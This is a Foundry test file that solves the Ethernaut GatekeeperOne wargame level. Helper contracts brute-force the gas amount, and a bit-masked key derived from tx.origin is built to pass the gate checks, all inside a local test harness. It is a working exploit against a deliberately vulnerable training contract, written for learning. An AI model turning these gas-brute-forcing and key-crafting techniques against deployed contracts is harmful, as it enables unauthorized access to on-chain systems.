// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/Ethernaut/GatekeeperOne.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract Helper1 {
  constructor(address _target, bytes8 _gateKey) {
    // How to find the right gas value to send to the contract?!
    // Calculating exact gas usage for each operation proved challenging...
    // I opted for a brute force approach with binary search (dichotomy) to find the value.
    // Steps:
    // 1. Modified GatekeeperOne's gate two to: `require(gasleft() >= 8191*10)`.
    // 2. Started with base gas of 8191*10 (81,910) + 500 gas = 82,410. This succeeded.
    // I started with a higher base because I noticed that using 10k or 20k gas reverts with an OutOfGas error.
    // 3. Tried base + 250 gas = 82,160. This failed.
    // 4. Iteratively narrowed down:
    //    - base + 267 gas (82,177) failed
    //    - base + 268 gas (82,178) succeeded
    require(
      GatekeeperOne(_target).enter{gas: 8191 * 10 + 268}(_gateKey),
      'Exploit succeeded'
    );
  }
}

contract Helper2 {
  constructor(address _target, bytes8 _gateKey) {
    GatekeeperOne target = GatekeeperOne(_target);
    uint gasAmount = 8191 * 10;
    bool success = false;
    uint i;
    while (!success) {
      i++;
      gasAmount += 1;
      try target.enter{gas: gasAmount}(_gateKey) returns (bool result) {
        success = result;
      } catch {}
    }
    console2.log('Exploit succeeded in %d tries', i);
  }
}

contract GatekeeperOneExploit is Test {
  GatekeeperOne target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new GatekeeperOne();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit1() public {
    address entrant = target.entrant();
    console2.log('Current entrant: %s', entrant);
    assertEq(entrant, address(0x0));

    // Set exploiter to be the msg.sender.
    // Note that we also pass a second argument to override cast's default tx.origin.
    vm.startPrank(exploiter, exploiter);
    bytes8 gateKey = bytes8(
      // Set the first significant byte to 0x11 (a random value) and all the other bytes to 0.
      // This enables to have:
      // - uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      // - uint32(uint64(_gateKey)) != uint64(_gateKey)
      (uint64(0x1100000000000000) & 0xFF00000000000000) |
        // Set the two last significant bytes to the two last significant bytes of tx.origin.
        // This enables to have: uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        (uint64(uint16(uint160(address(exploiter)))) & 0x000000000000FFFF)
    );
    new Helper1(address(target), gateKey);
    vm.stopPrank();

    entrant = target.entrant();
    console2.log('New entrant: %s', entrant);
    assertEq(entrant, address(exploiter));
  }

  function testExploit2() public {
    address entrant = target.entrant();
    console2.log('Current entrant: %s', entrant);
    assertEq(entrant, address(0x0));

    // Set exploiter to be the msg.sender.
    // Note that we also pass a second argument to override cast's default tx.origin.
    // This is required for gate 1.
    vm.startPrank(exploiter, exploiter);
    bytes8 gateKey = bytes8(
      // Set the first significant byte to 0x11 (a random value) and all the other bytes to 0.
      // This enables to have:
      // - uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      // - uint32(uint64(_gateKey)) != uint64(_gateKey)
      (uint64(0x1100000000000000) & 0xFF00000000000000) |
        // Set the two last significant bytes to the two last significant bytes of tx.origin.
        // This enables to have: uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        (uint64(uint16(uint160(address(exploiter)))) & 0x000000000000FFFF)
    );
    new Helper2(address(target), gateKey);
    vm.stopPrank();

    entrant = target.entrant();
    console2.log('New entrant: %s', entrant);
    assertEq(entrant, address(exploiter));
  }
}
